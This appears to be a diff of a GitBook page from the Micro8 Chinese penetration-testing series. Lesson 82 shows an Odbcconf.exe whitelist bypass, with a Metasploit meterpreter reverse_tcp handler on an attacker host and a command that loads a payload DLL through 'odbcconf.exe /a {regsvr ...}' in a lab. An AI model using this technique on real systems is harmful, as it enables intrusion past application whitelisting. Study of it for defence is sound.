@@ -1,14 +1,14 @@
 
 <!DOCTYPE HTML>
-<html lang="" >
+<html lang="zh-hans" >
     <head>
         <meta charset="UTF-8">
         <meta content="text/html; charset=utf-8" http-equiv="Content-Type">
-        <title>第八十二课：基于白名单Odbcconf执行payload第十二季 · GitBook</title>
+        <title>第八十二课：基于白名单Odbcconf执行payload第十二季 · Micro8 系列教程</title>
         <meta http-equiv="X-UA-Compatible" content="IE=edge" />
         <meta name="description" content="">
         <meta name="generator" content="GitBook 3.2.3">
-        
+        <meta name="author" content="Micro8 系列作者">
         
         
     
@@ -17,17 +17,33 @@
     
             
                 
-                <link rel="stylesheet" href="../../gitbook/gitbook-plugin-highlight/website.css">
+                <link rel="stylesheet" href="../../gitbook/gitbook-plugin-search-plus/search.css">
                 
             
                 
-                <link rel="stylesheet" href="../../gitbook/gitbook-plugin-search/search.css">
+                <link rel="stylesheet" href="../../gitbook/gitbook-plugin-prism/prism-darcula.css">
+                
+            
+                
+                <link rel="stylesheet" href="../../gitbook/gitbook-plugin-splitter/splitter.css">
+                
+            
+                
+                <link rel="stylesheet" href="../../gitbook/gitbook-plugin-tbfed-pagefooter/footer.css">
+                
+            
+                
+                <link rel="stylesheet" href="../../gitbook/gitbook-plugin-donate/plugin.css">
                 
             
                 
                 <link rel="stylesheet" href="../../gitbook/gitbook-plugin-fontsettings/website.css">
                 
             
+                
+                <link rel="stylesheet" href="../../gitbook/gitbook-plugin-theme-comscore/test.css">
+                
+            
         
 
     
@@ -47,6 +63,7 @@
     
 
         
+    
     
     
     <meta name="HandheldFriendly" content="true"/>
@@ -63,6 +80,17 @@
     <link rel="prev" href="81_基于白名单Rundll32.exe执行payload第十一季.html" />
     
 
+    <style>
+    @media only screen and (max-width: 640px) {
+        .book-header .hidden-mobile {
+            display: none;
+        }
+    }
+    </style>
+    <script>
+        window["gitbook-plugin-github-buttons"] = {"repo":"https://github.com/Micropoor/Micro8","types":["star","watch","fork"],"size":"small"};
+    </script>
+
     </head>
     <body>
         
@@ -71,7 +99,7 @@
         
             
 <div id="book-search-input" role="search">
-    <input type="text" placeholder="Type to search" />
+    <input type="text" placeholder="输入并搜索" />
 </div>
 
             
@@ -82,7 +110,21 @@
 <ul class="summary">
     
     
+    
+        
+        <li>
+            <a href="https://micropoor.blogspot.com" target="_blank" class="custom-link">Micropoor</a>
+        </li>
+    
+        
+        <li>
+            <a href="https://github.com/micro8" target="_blank" class="custom-link">Github Micro8</a>
+        </li>
+    
+    
 
+    
+    <li class="divider"></li>
     
 
     
@@ -1785,7 +1827,7 @@
 
     <li>
         <a href="https://www.gitbook.com" target="blank" class="gitbook-link">
-            Published with GitBook
+            本书使用 GitBook 发布
         </a>
     </li>
 </ul>
@@ -1818,7 +1860,7 @@
                     <div class="page-wrapper" tabindex="-1" role="main">
                         <div class="page-inner">
                             
-<div id="book-search-results">
+<div class="search-plus" id="book-search-results">
     <div class="search-noresults">
     
                                 <section class="normal markdown-section">
@@ -1830,33 +1872,33 @@
 <p>&#x5FAE;&#x8F6F;&#x5B98;&#x65B9;&#x6587;&#x6863;&#xFF1A;<br><a href="https://docs.microsoft.com/en-us/sql/odbc/odbcconf-exe?view=sql-server-2017" target="_blank">https://docs.microsoft.com/en-us/sql/odbc/odbcconf-exe?view=sql-server-2017</a></p>
 <p>&#x8BF4;&#x660E;&#xFF1A;Odbcconf.exe&#x6240;&#x5728;&#x8DEF;&#x5F84;&#x5DF2;&#x88AB;&#x7CFB;&#x7EDF;&#x6DFB;&#x52A0;PATH&#x73AF;&#x5883;&#x53D8;&#x91CF;&#x4E2D;&#xFF0C;&#x56E0;&#x6B64;&#xFF0C;Odbcconf&#x547D;&#x4EE4;&#x53EF;&#x8BC6;&#x522B;&#xFF0C;&#x9700;&#x6CE8;&#x610F;x86&#xFF0C;x64&#x4F4D;&#x7684;Odbcconf&#x8C03;&#x7528;&#x3002;</p>
 <p>Windows 2003 &#x9ED8;&#x8BA4;&#x4F4D;&#x7F6E;&#xFF1A;</p>
-<pre><code class="lang-bash">C:\WINDOWS\system32\odbcconf.exe
-C:\WINDOWS\SysWOW64\odbcconf.exe`
+<pre class="language-"><code class="lang-bash">C:\WINDOWS\system32\odbcconf.exe
+C:\WINDOWS\SysWOW64\odbcconf.exe<span class="token variable"><span class="token variable">`</span>
 
 Windows 7 &#x9ED8;&#x8BA4;&#x4F4D;&#x7F6E;&#xFF1A;
-`C:\Windows\System32\odbcconf.exe
+<span class="token variable">`</span></span>C:\Windows\System32\odbcconf.exe
 C:\Windows\SysWOW64\odbcconf.exe
 </code></pre>
 <p><strong>&#x653B;&#x51FB;&#x673A;&#xFF1A;</strong><br>192.168.1.4 Debian  </p>
 <p><strong>&#x9776;&#x673A;&#xFF1A;</strong><br>192.168.1.119 Windows 2003<br>192.168.1.5 Windows 7</p>
 <h3 id="&#x914D;&#x7F6E;&#x653B;&#x51FB;&#x673A;msf&#xFF1A;">&#x914D;&#x7F6E;&#x653B;&#x51FB;&#x673A;msf&#xFF1A;</h3>
 <p><strong>&#x6CE8;&#xFF1A;x86 payload</strong></p>
-<pre><code class="lang-bash">msf exploit(multi/handler) &gt; show options 
+<pre class="language-"><code class="lang-bash">msf exploit<span class="token punctuation">(</span>multi/handler<span class="token punctuation">)</span> <span class="token operator">&gt;</span> show options 
 
-Module options (exploit/multi/handler): 
+Module options <span class="token punctuation">(</span>exploit/multi/handler<span class="token punctuation">)</span>: 
 
 Name Current Setting Required Description
 &#x2010;&#x2010;&#x2010;&#x2010; &#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010; &#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010; &#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010; 
 
-Payload options (windows/meterpreter/reverse_tcp): 
+Payload options <span class="token punctuation">(</span>windows/meterpreter/reverse_tcp<span class="token punctuation">)</span>: 
 
 Name Current Setting Required Description
 &#x2010;&#x2010;&#x2010;&#x2010; &#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010; &#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010; &#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;
-EXITFUNC process yes Exit technique (Accepted: <span class="hljs-string">&apos;&apos;</span>, seh, thread, process, none)
+EXITFUNC process <span class="token function">yes</span> Exit technique <span class="token punctuation">(</span>Accepted: <span class="token string">&apos;&apos;</span>, seh, thread, process, none<span class="token punctuation">)</span>
 
-LHOST 192.168.1.4 yes The listen address (an interface may be specified)
+LHOST 192.168.1.4 <span class="token function">yes</span> The listen address <span class="token punctuation">(</span>an interface may be specified<span class="token punctuation">)</span>
 
-LPORT 53 yes The listen port 
+LPORT 53 <span class="token function">yes</span> The listen port 
 
 Exploit target: 
 
@@ -1865,15 +1907,15 @@ Id Name
 &#x2010;&#x2010; &#x2010;&#x2010;&#x2010;&#x2010;
 0 Wildcard Target 
 
-msf exploit(multi/handler) &gt; exploit 
+msf exploit<span class="token punctuation">(</span>multi/handler<span class="token punctuation">)</span> <span class="token operator">&gt;</span> exploit 
 
-[*] Started reverse TCP handler on 192.168.1.4:53
+<span class="token punctuation">[</span>*<span class="token punctuation">]</span> Started reverse TCP handler on 192.168.1.4:53
 </code></pre>
 <p><img src="media/ba0e4d6c7b05eef6b8bcd5a730fb0c0b.jpg" alt=""></p>
 <h3 id="&#x9776;&#x673A;&#x6267;&#x884C;&#xFF1A;windows-2003">&#x9776;&#x673A;&#x6267;&#x884C;&#xFF1A;Windows 2003</h3>
 <p><strong>&#x6CE8;&#xFF1A;</strong>&#x6587;&#x4E2D;&#x4E3A;&#x4E86;&#x66F4;&#x597D;&#x7684;&#x8DE8;Windows 03--Windows 2016&#xFF0C;Odbcconf for dll&#x91C7;&#x7EAF;C&#x91CD;&#x65B0;&#x7F16;&#x5199;&#x3002;  </p>
 <p><img src="media/df24184d409a2c0d09bbd18c511bc231.jpg" alt=""></p>
-<pre><code class="lang-bash">C:\Windows\SysWOW64\odbcconf.exe /a {regsvr C:\Micropoor_Odbcconf.dll}
+<pre class="language-"><code class="lang-bash">C:\Windows\SysWOW64\odbcconf.exe /a <span class="token punctuation">{</span>regsvr C:\Micropoor_Odbcconf.dll<span class="token punctuation">}</span>
 </code></pre>
 <p><strong>&#x6CE8;&#xFF1A;x64</strong> Odbcconf.exe<br><img src="media/74bf5a42540b5298cffc72cfa8987743.jpg" alt="">  </p>
 <p><img src="media/c8a788e729ff4969f70affe596b8f3a5.jpg" alt=""></p>
@@ -1891,7 +1933,9 @@ msf exploit(multi/handler) &gt; exploit
 <blockquote>
 <p>  Micropoor</p>
 </blockquote>
-
+<footer class="page-footer"><span class="copyright">Copyright &#xA9; Micro8 2018 all right reserved&#xFF0C;powered by Gitbook</span><span class="footer-modification">&#x4FEE;&#x8BA2;&#x65F6;&#x95F4;&#xFF1A;
+2019-02-23 20:25
+</span></footer>
                                 
                                 </section>
                             
@@ -1934,7 +1978,7 @@ msf exploit(multi/handler) &gt; exploit
     <script>
         var gitbook = gitbook || [];
         gitbook.push(function() {
-            gitbook.page.hasChanged({"page":{"title":"第八十二课：基于白名单Odbcconf执行payload第十二季","level":"1.4.82","depth":2,"next":{"title":"第八十三课：基于白名单PsExec执行payload第十三季 ","level":"1.4.83","depth":2,"path":"Chapter1/81-90/83_基于白名单PsExec执行payload第十三季.md","ref":"Chapter1/81-90/83_基于白名单PsExec执行payload第十三季.md","articles":[]},"previous":{"title":"第八十一课：基于白名单Rundll32.exe执行payload第十一季","level":"1.4.81","depth":2,"path":"Chapter1/81-90/81_基于白名单Rundll32.exe执行payload第十一季.md","ref":"Chapter1/81-90/81_基于白名单Rundll32.exe执行payload第十一季.md","articles":[]},"dir":"ltr"},"config":{"gitbook":"*","theme":"default","variables":{},"plugins":[],"pluginsConfig":{"highlight":{},"search":{},"lunr":{"maxIndexSize":1000000,"ignoreSpecialCharacters":false},"sharing":{"facebook":true,"twitter":true,"google":false,"weibo":false,"instapaper":false,"vk":false,"all":["facebook","google","twitter","weibo","instapaper"]},"fontsettings":{"theme":"white","family":"sans","size":2},"theme-default":{"styles":{"website":"styles/website.css","pdf":"styles/pdf.css","epub":"styles/epub.css","mobi":"styles/mobi.css","ebook":"styles/ebook.css","print":"styles/print.css"},"showLevel":false}},"structure":{"langs":"LANGS.md","readme":"README.md","glossary":"GLOSSARY.md","summary":"SUMMARY.md"},"pdf":{"pageNumbers":true,"fontSize":12,"fontFamily":"Arial","paperSize":"a4","chapterMark":"pagebreak","pageBreaksBefore":"/","margin":{"right":62,"left":62,"top":56,"bottom":56}},"styles":{"website":"styles/website.css","pdf":"styles/pdf.css","epub":"styles/epub.css","mobi":"styles/mobi.css","ebook":"styles/ebook.css","print":"styles/print.css"}},"file":{"path":"Chapter1/81-90/82_基于白名单Odbcconf执行payload第十二季.md","mtime":"2019-02-23T12:25:13.961Z","type":"markdown"},"gitbook":{"version":"3.2.3","time":"2019-02-25T04:00:06.266Z"},"basePath":"../..","book":{"language":""}});
+            gitbook.page.hasChanged({"page":{"title":"第八十二课：基于白名单Odbcconf执行payload第十二季","level":"1.4.82","depth":2,"next":{"title":"第八十三课：基于白名单PsExec执行payload第十三季 ","level":"1.4.83","depth":2,"path":"Chapter1/81-90/83_基于白名单PsExec执行payload第十三季.md","ref":"Chapter1/81-90/83_基于白名单PsExec执行payload第十三季.md","articles":[]},"previous":{"title":"第八十一课：基于白名单Rundll32.exe执行payload第十一季","level":"1.4.81","depth":2,"path":"Chapter1/81-90/81_基于白名单Rundll32.exe执行payload第十一季.md","ref":"Chapter1/81-90/81_基于白名单Rundll32.exe执行payload第十一季.md","articles":[]},"dir":"ltr"},"config":{"plugins":["-lunr","-search","search-plus","-highlight","prism","theme-comscore","splitter","-sharing","sharing-plus","-expandable-chapters-small","simple-page-toc","github","github-buttons","tbfed-pagefooter","donate","ga"],"root":".","styles":{"website":"styles/website.css","pdf":"styles/pdf.css","epub":"styles/epub.css","mobi":"styles/mobi.css","ebook":"styles/ebook.css","print":"styles/print.css"},"pluginsConfig":{"tbfed-pagefooter":{"copyright":"Copyright © Micro8 2018","modify_label":"修订时间：","modify_format":"YYYY-MM-DD HH:mm"},"prism":{"css":["prism-themes/themes/prism-darcula.css"]},"github":{"url":"https://github.com/micro8"},"simple-page-toc":{"maxDepth":3,"skipFirstH1":true},"splitter":{},"sharing-plus":{"qq":false,"all":["facebook","google","twitter","instapaper","linkedin","pocket","stumbleupon"],"douban":false,"facebook":true,"weibo":false,"instapaper":false,"whatsapp":false,"hatenaBookmark":false,"twitter":true,"messenger":false,"line":false,"vk":false,"pocket":true,"google":false,"viber":false,"stumbleupon":false,"qzone":false,"linkedin":false},"donate":{"alipay":"","alipayText":"支付宝打赏","button":"赞赏码","title":"有读者问赞赏码，如下，自愿：","wechat":"./dashang.png","wechatText":""},"fontsettings":{"theme":"white","family":"sans","size":2},"theme-comscore":{},"github-buttons":{"repo":"https://github.com/Micropoor/Micro8","types":["star","watch","fork"],"size":"small"},"ga":{"configuration":"auto","token":"UA-135003278-1"},"sharing":{"qq":false,"all":["facebook","google","twitter","weibo","instapaper","linkedin","pocket","stumbleupon"],"douban":false,"facebook":false,"weibo":false,"instapaper":false,"whatsapp":false,"hatenaBookmark":false,"twitter":false,"messenger":false,"line":false,"vk":false,"pocket":false,"google":false,"viber":false,"stumbleupon":false,"qzone":false,"linkedin":false},"theme-default":{"styles":{"website":"styles/website.css","pdf":"styles/pdf.css","epub":"styles/epub.css","mobi":"styles/mobi.css","ebook":"styles/ebook.css","print":"styles/print.css"},"showLevel":false},"search-plus":{}},"theme":"default","author":"Micro8 系列作者","pdf":{"pageNumbers":true,"fontSize":12,"fontFamily":"Arial","paperSize":"a4","chapterMark":"pagebreak","pageBreaksBefore":"/","margin":{"right":62,"left":62,"top":56,"bottom":56}},"structure":{"langs":"LANGS.md","readme":"README.md","glossary":"GLOSSARY.md","summary":"SUMMARY.md"},"variables":{},"title":"Micro8 系列教程","language":"zh-hans","links":{"sidebar":{"Micropoor":"https://micropoor.blogspot.com","Github Micro8":"https://github.com/micro8"}},"gitbook":"*","description":"Micro8"},"file":{"path":"Chapter1/81-90/82_基于白名单Odbcconf执行payload第十二季.md","mtime":"2019-02-23T12:25:13.961Z","type":"markdown"},"gitbook":{"version":"3.2.3","time":"2019-02-25T13:55:17.972Z"},"basePath":"../..","book":{"language":""}});
         });
     </script>
 </div>
@@ -1944,27 +1988,43 @@ msf exploit(multi/handler) &gt; exploit
     <script src="../../gitbook/theme.js"></script>
     
         
-        <script src="../../gitbook/gitbook-plugin-search/search-engine.js"></script>
+        <script src="../../gitbook/gitbook-plugin-search-plus/jquery.mark.min.js"></script>
         
     
         
-        <script src="../../gitbook/gitbook-plugin-search/search.js"></script>
+        <script src="../../gitbook/gitbook-plugin-search-plus/search.js"></script>
         
     
         
-        <script src="../../gitbook/gitbook-plugin-lunr/lunr.min.js"></script>
+        <script src="../../gitbook/gitbook-plugin-splitter/splitter.js"></script>
         
     
         
-        <script src="../../gitbook/gitbook-plugin-lunr/search-lunr.js"></script>
+        <script src="../../gitbook/gitbook-plugin-sharing-plus/buttons.js"></script>
         
     
         
-        <script src="../../gitbook/gitbook-plugin-sharing/buttons.js"></script>
+        <script src="../../gitbook/gitbook-plugin-github/plugin.js"></script>
+        
+    
+        
+        <script src="../../gitbook/gitbook-plugin-github-buttons/plugin.js"></script>
+        
+    
+        
+        <script src="../../gitbook/gitbook-plugin-donate/plugin.js"></script>
+        
+    
+        
+        <script src="../../gitbook/gitbook-plugin-ga/plugin.js"></script>
         
     
         
         <script src="../../gitbook/gitbook-plugin-fontsettings/fontsettings.js"></script>
+        
+    
+        
+        <script src="../../gitbook/gitbook-plugin-theme-comscore/test.js"></script>
         
     
 
